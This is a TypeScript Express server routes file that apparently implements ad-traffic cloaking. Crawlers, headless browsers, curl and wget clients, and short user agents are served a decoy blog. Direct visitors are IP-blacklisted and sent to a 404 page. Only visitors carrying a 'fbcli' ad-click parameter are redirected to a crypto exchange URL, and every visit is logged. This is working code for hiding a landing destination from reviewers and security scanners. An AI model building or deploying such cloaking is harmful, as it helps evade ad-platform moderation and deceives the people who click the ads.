import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertBlacklistedIpSchema, insertVisitorLogSchema } from "@shared/schema";
import { ZodError } from "zod";

// List of common bot user agent patterns
const BOT_PATTERNS = [
  // Basic patterns
  'bot', 'crawler', 'spider', 'slurp', 'googlebot', 'bingbot', 'yahoo', 
  'baidu', 'yandex', 'duckduckbot', 'facebookexternalhit', 'semrushbot',
  'ahrefsbot', 'mj12bot', 'baiduspider', 'ia_archiver',
  
  // Google bot patterns
  'googlebot-', 'adsbot-google', 'mediapartners-google', 'apis-google', 'feedfetcher-google',
  
  // Bing and other search engine bots
  'adidxbot', 'msnbot', 'bingbot',
  
  // Yahoo and others
  'slurp', 'yahoo',
  
  // Common crawlers and libraries
  'wget', 'curl', 'python-urllib', 'python-requests', 'libwww',
  'httpunit', 'nutch', 'go-http-client', 'phpcrawl',
  
  // Social media bots
  'linkedinbot',
  
  // Other well-known crawlers
  'fast-webcrawler', 'fast enterprise crawler', 'biglotron', 'teoma', 'convera'
];

// Function to check if user agent is a bot
function isBot(userAgent: string): boolean {
  if (!userAgent) return false;
  
  const lowerCaseUA = userAgent.toLowerCase();
  
  // First check common bot patterns
  if (BOT_PATTERNS.some(pattern => lowerCaseUA.includes(pattern))) {
    return true;
  }
  
  // Check for common indicators in the user agent string
  const botIndicators = [
    // URL patterns often included in bot user agents
    'http://www.google.com/bot.html',
    'http://help.yahoo.com/help/us/ysearch/slurp',
    'http://www.bing.com/bingbot.htm',
    'http://search.msn.com/msnbot.htm',
    
    // Common bot keywords not covered in patterns
    'headlesschrome',
    'phantomjs',
    'selenium',
    'webdriver',
    'scraper',
    'crawler',
    'archiver'
  ];
  
  if (botIndicators.some(indicator => lowerCaseUA.includes(indicator))) {
    return true;
  }
  
  // Additional heuristics - user agents that are too short or overly simple
  // are often bots trying to be stealthy
  if (userAgent.length < 20) {
    return true;
  }
  
  return false;
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Get visitor information
  app.get('/api/check-visitor', async (req: Request, res: Response) => {
    try {
      const ipAddress = req.headers['x-forwarded-for'] as string || 
                        req.socket.remoteAddress || 
                        '0.0.0.0';
      const userAgent = req.headers['user-agent'] || '';
      const url = req.query.url as string || '';
      const clientBlacklisted = req.query.clientBlacklisted === 'true';
      const hasParameter = url.includes('fbcli');
      
      // Check if IP is already blacklisted in server memory
      let isBlacklisted = await storage.isIpBlacklisted(ipAddress);
      
      // Honor client-side blacklisting and update server
      if (clientBlacklisted && !isBlacklisted) {
        console.log(`Received client blacklist status for IP: ${ipAddress}, updating server blacklist`);
        const blacklistedIp = insertBlacklistedIpSchema.parse({
          ipAddress,
          userAgent
        });
        
        await storage.blacklistIp(blacklistedIp);
        isBlacklisted = true;
      }
      
      // Check if visitor is a bot
      const botStatus = isBot(userAgent);
      
      // Determine redirect target
      const redirectTarget = botStatus || isBlacklisted || !hasParameter ? 
        (botStatus || isBlacklisted ? '/blog' : '/404') : 
        'https://binance.com';
      
      // Log this visit
      const visitorLog = insertVisitorLogSchema.parse({
        ipAddress,
        userAgent,
        isBot: botStatus,
        parameters: JSON.stringify(req.query),
        redirectedTo: redirectTarget
      });
      
      await storage.logVisitor(visitorLog);
      
      // Blacklist user if they don't have the required parameter and aren't a bot or already blacklisted
      if (!botStatus && !hasParameter && !isBlacklisted) {
        console.log(`Blacklisting direct visitor IP: ${ipAddress}`);
        const blacklistedIp = insertBlacklistedIpSchema.parse({
          ipAddress,
          userAgent
        });
        
        await storage.blacklistIp(blacklistedIp);
        isBlacklisted = true;
      }
      
      res.json({
        isBot: botStatus,
        isBlacklisted,
        hasParameter,
        redirectTo: redirectTarget
      });
    } catch (error) {
      console.error('Error checking visitor:', error);
      
      if (error instanceof ZodError) {
        res.status(400).json({ error: 'Invalid request data', details: error.errors });
      } else {
        res.status(500).json({ error: 'Internal server error' });
      }
    }
  });
  
  // Get blog posts
  app.get('/api/blog-posts', async (_req: Request, res: Response) => {
    try {
      const blogPosts = await storage.getAllBlogPosts();
      res.json(blogPosts);
    } catch (error) {
      console.error('Error fetching blog posts:', error);
      res.status(500).json({ error: 'Failed to fetch blog posts' });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
